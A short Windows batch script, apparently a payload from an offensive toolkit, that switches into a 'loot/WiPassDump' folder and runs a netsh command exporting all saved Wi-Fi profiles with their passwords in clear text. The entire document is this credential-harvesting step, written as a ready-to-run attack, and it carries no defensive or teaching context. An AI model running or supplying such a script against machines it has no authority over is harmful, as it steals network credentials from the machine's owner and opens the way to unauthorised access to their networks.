REM Go to dump directory
cd /d %~dp0
cd ../../loot/WiPassDump/

REM Dump saved Wi-Fi infos
netsh wlan export profile key=clear